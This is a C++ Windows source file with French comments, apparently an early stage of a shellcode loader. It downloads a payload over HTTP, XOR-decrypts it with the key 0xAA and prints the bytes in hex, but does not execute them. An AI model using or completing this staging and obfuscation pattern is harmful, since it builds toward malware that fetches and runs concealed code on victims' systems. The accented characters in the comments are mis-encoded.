#include <iostream> 
#include <stdio.h>
#include <Windows.h>


#include "http.h"
#include "decryptPayload.h"


#include <tchar.h>


// Cl� XOR utilis�e pour le chiffrement
#define ENCRYPTION_KEY 0xAA

int main() {

    //R�cup�ration du shellcode

    DWORD payloadSize = 0;
    PBYTE payload = getHTTPPayload(payloadSize);

    if (!payload) {
        std::cerr << "Erreur le shellcode n'est pas accessible " << std::endl;
        return 1;
    }

    std::cout << "Shellcode :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    // D�chiffrement du payload
    UCHAR* decryptedPayload = (UCHAR*)LocalAlloc(LPTR, payloadSize);
    if (!decryptedPayload) {
        std::cerr << "Erreur d'allocation m�moire pour le d�chiffrement." << std::endl;
        free(payload);
        return 1;
    }

    for (DWORD i = 0; i < payloadSize; i++) {
        decryptedPayload[i] = payload[i] ^ ENCRYPTION_KEY; // D�chiffrement avec la cl� XOR
    }

    std::cout << "Payload d�chiffr� :" << std::endl;
    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", decryptedPayload[i]);
    }
    std::cout << std::endl;

    // Nettoyage
    if (decryptedPayload) {
        LocalFree(decryptedPayload);
    }
    if (payload) {
        free(payload); // Lib�ration de la m�moire allou�e par getHTTPPayload
    }



    return 0;
}
